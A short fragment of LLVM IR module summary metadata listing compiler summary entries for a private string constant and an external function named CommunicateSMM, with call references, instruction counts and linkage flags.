^27 = gv: (name: ".str.5", summaries: (variable: (module: ^0, flags: (linkage: private, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), varFlags: (readonly: 1, writeonly: 0, constant: 1)))) ; guid = 15740610876201889235
^28 = gv: (name: "CommunicateSMM", summaries: (function: (module: ^0, flags: (linkage: external, notEligibleToImport: 1, live: 0, dsoLocal: 1, canAutoHide: 0), insts: 40, calls: ((callee: ^20), (callee: ^26), (callee: ^17), (callee: ^1), (callee: ^15), (callee: ^16), (callee: ^10), (callee: ^11)), refs: (^14, ^5, ^18, ^12, ^19)))) ; guid = 18115549259023970846
^29 = flags: 8
^30 = blockcount: 13
